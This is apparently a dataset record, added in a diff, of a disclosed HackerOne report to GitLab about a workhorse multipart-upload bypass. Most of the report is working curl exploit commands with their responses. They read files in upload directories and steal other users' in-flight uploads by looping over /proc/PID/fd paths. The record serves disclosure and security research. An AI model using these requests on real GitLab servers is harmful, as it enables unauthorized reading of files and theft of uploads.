@@ -1,0 +1,46 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "vakzz ",
+  "title": "gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read",
+  "content": "\nSummary\nExtracted from https://hackerone.com/reports/835455#activity-7672566\nWhile testing and looking at the patch for the nuget package workhorse bypass (https://gitlab.com/gitlab-org/gitlab/issues/209080 I think) I came across a more widespread bypass:\nCode 265 Bytes\n1# create test file on gitlab server\n2echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg\n3\n4# attacker\n5curl -XPUT -v -F '[package]=@/tmp/lala.txt' \"http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg\"\n6\n7{\"message\":\"201 Created\"}\nUsing [package] as the field name causes the @rewritten_fields to contain:\nCode 154 Bytes\n1{\n2  \"rewritten_fields\": {\n3    \"[package]\": \"/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799\"\n4  },\n5  \"iss\": \"gitlab-workhorse\"\n6}\nThis is then used parsed_field = Rack::Utils.parse_nested_query(field) which ends up creating the hash {\"package\"=>nil} (same as package would return). This passes the validation, but the Multipart::Handler will then use the query params as they match instead of the payload that workhorse sends through.\nThis also allows for any file in the following to be accessed:\nCode 252 Bytes\n1       def allowed_paths\n2          [\n3            ::FileUploader.root,\n4            Gitlab.config.uploads.storage_path,\n5            JobArtifactUploader.workhorse_upload_path,\n6            File.join(Rails.root, 'public/uploads/tmp')\n7          ]\n8        end\nThis could be done anywhere that accelerated uploads, eg the UploadsController or uploading a wiki file.\nUsing the wiki api removes the restriction that the file needs to be owned by git due to file_content: attrs[:file].read happening instead of moving the original file:\nCode 441 Bytes\n1echo hello > /tmp/ggg; sudo chown root:root /tmp/ggg\n2\n3$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'\n4\n5{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\nIt's also fairly easy to steal incoming files tmp files that are currently opened in rails by:\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n500\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n201\n\n$ while true; do curl -s -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done\n\n{\"file_name\":\"image.png115893730\",\"file_path\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"markdown\":\"[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)\"}}\n\nSteps to reproduce\ncreate a new project\ncreate a wiki page\ncreate a test file on the gitlab server: echo hello > /tmp/ggg;\ncreate a dummy file on the attackers server echo unused > /tmp/lala.txt\n$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`\n{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\n```\npaste the markdown into the wiki page and download the file\nImpact\nread known files in ::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')\nread unknown inflight files by using the symlinks in /proc/PID/fd/XX belonging to other users.\nExamples\nhttps://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home The above was uploaded using file.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html to verify.\nWhat is the current bug behavior?\nAn attacker can specify file.* params and have gitlab believe they are valid and signed\nWhat is the expected correct behavior?\nOnly params from the workhorse should be valid\nOutput of checks\nResults of GitLab environment info\nCode 907 Bytes\n1System information\n2System:     Ubuntu 18.04\n3Proxy:      no\n4Current User:   git\n5Using RVM:  no\n6Ruby Version:   2.6.5p114\n7Gem Version:    2.7.10\n8Bundler Version:1.17.3\n9Rake Version:   12.3.3\n10Redis Version:  5.0.7\n11Git Version:    2.24.1\n12Sidekiq Version:5.2.7\n13Go Version: unknown\n14\n15GitLab information\n16Version:    12.9.3-ee\n17Revision:   7c13691fb8e\n18Directory:  /opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter: PostgreSQL\n20DB Version: 10.12\n21URL:        http://gitlab-vm.local\n22HTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\n23SSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\n24Elasticsearch:  no\n25Geo:        no\n26Using LDAP: no\n27Using Omniauth: yes\n28Omniauth Providers:\n29\n30GitLab Shell\n31Version:    12.0.0\n32Repository storage paths:\n33- default:  /var/opt/gitlab/git-data/repositories\n34GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\n35Git:        /opt/gitlab/embedded/bin/git\nImpact\nread known files in ::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')\nread unknown inflight files by using the symlinks in /proc/PID/fd/XX belonging to other users.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 10000,
+  "weaknesses": [
+    "Information Disclosure"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1591606620,
+  "report_url": "https://hackerone.com/reports/850447",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Create a test file on the GitLab server: `echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg`"
+    ],
+    [
+      2,
+      "As an attacker, execute a crafted curl command to bypass GitLab's file access restrictions: `curl -XPUT -v -F '[package]=@/tmp/lala.txt' \"http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg\"`"
+    ],
+    [
+      3,
+      "Alternatively, use the wiki API to read files not owned by the git user: `curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`"
+    ],
+    [
+      4,
+      "Exploit /proc/PID/fd/XX symlinks to read in-flight files from other users by repeatedly trying different process IDs and file descriptors"
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to bypass GitLab's file access restrictions by manipulating multipart upload field names and paths. This enables reading arbitrary files within allowed_paths directories, including files in /proc/PID/fd/XX which can expose in-flight uploads from other users. The issue stems from improper validation of rewritten_fields in Gitlab::Middleware::Multipart, where specially crafted field names can bypass security checks.",
+  "reason": "This vulnerability requires understanding of multiple components: GitLab's workhorse architecture, multipart upload handling, file path validation, and /proc filesystem exploitation. The attack involves subtle interactions between field name parsing and path validation logic, plus knowledge of how to exploit temporary file handling through /proc. The need to chain these components together and understand their interdependencies increases the discovery difficulty.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "209080"
+}
